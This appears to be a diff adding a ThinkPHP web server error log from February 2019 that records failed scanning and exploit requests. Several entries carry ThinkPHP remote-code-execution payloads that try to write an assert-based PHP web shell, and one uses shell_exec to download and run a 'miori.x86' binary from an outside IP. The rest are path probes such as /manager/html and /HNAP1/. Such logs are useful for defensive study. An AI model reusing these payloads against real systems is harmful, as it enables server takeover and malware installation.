@@ -1,0 +1,51 @@
+[ 2019-02-11T04:11:29+08:00 ] 118.143.205.71 /index.php?s=index/%5Cthink%5CRequest/input&filter=system&data=echo%20%5E%3C?php%20@assert($_POST[mds]);?%5E%3E%20%3Emedusa.php
+ERR: 非法操作:\think\Request
+
+[ 2019-02-11T04:11:31+08:00 ] 118.143.205.71 /index.php?s=index/%5Cthink%5Ctemplate%5Cdriver%5Cfile/write&cacheFile=medusa.php&content=%3C?php%20@assert($_POST[mds]);?%3E
+ERR: 非法操作:\think\template\driver\file
+
+[ 2019-02-11T04:11:31+08:00 ] 118.143.205.71 /index.php?s=index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20%5E%3C?php%20@assert($_POST[mds]);?%5E%3E%20%3Emedusa.php
+ERR: 非法操作:\think\app
+
+[ 2019-02-11T04:11:33+08:00 ] 118.143.205.71 /index.php?s=index/%5Cthink%5CContainer/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20%5E%3C?php%20@assert($_POST[mds]);?%5E%3E%20%3Emedusa.php
+ERR: 非法操作:\think\Container
+
+[ 2019-02-11T04:11:47+08:00 ] 118.143.205.71 /index.php?s=index/%5Cthink%5CRequest/input&filter=system&data=echo%20%22%3C?php%20@assert(%5C$_POST[mds]);?%3E%22%20%3Emedus.php
+ERR: 非法操作:\think\Request
+
+[ 2019-02-11T04:11:48+08:00 ] 118.143.205.71 /index.php?s=index/%5Cthink%5Ctemplate%5Cdriver%5Cfile/write&cacheFile=medus.php&content=%3C?php%20@assert(%5C$_POST[mds]);?%3E
+ERR: 非法操作:\think\template\driver\file
+
+[ 2019-02-11T04:11:49+08:00 ] 118.143.205.71 /index.php?s=index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20%22%3C?php%20@assert(%5C$_POST[mds]);?%3E%22%20%3Emedus.php
+ERR: 非法操作:\think\app
+
+[ 2019-02-11T04:11:50+08:00 ] 118.143.205.71 /index.php?s=index/%5Cthink%5CContainer/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20%22%3C?php%20@assert(%5C$_POST[mds]);?%3E%22%20%3Emedus.php
+ERR: 非法操作:\think\Container
+
+[ 2019-02-11T06:59:39+08:00 ] 185.172.110.88 /index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20http://185.244.25.148/miori.x86;%20chmod%20777%20miori.x86;./miori.x86%20thinkphp
+ERR: 非法操作:\think\app
+
+[ 2019-02-11T07:31:32+08:00 ] 211.149.250.161 /webdav/
+ERR: 无法加载控制器:Webdav
+
+[ 2019-02-11T07:32:29+08:00 ] 211.149.250.161 /manager/html
+ERR: 无法加载控制器:Manager
+
+[ 2019-02-11T17:38:38+08:00 ] 35.221.223.61 /alipay.html
+ERR: 无法加载控制器:Alipay
+
+[ 2019-02-11T17:38:39+08:00 ] 35.221.223.61 /88888888
+ERR: 无法加载控制器:88888888
+
+[ 2019-02-11T17:38:39+08:00 ] 35.221.223.61 /88888888
+ERR: 无法加载控制器:88888888
+
+[ 2019-02-11T22:01:28+08:00 ] 14.17.3.65 /alipay.html
+ERR: 无法加载控制器:Alipay
+
+[ 2019-02-11T22:58:49+08:00 ] 58.251.121.184 /88888888
+ERR: 无法加载控制器:88888888
+
+[ 2019-02-11T23:13:49+08:00 ] 188.19.238.116 /HNAP1/
+ERR: 无法加载控制器:HNAP1
+
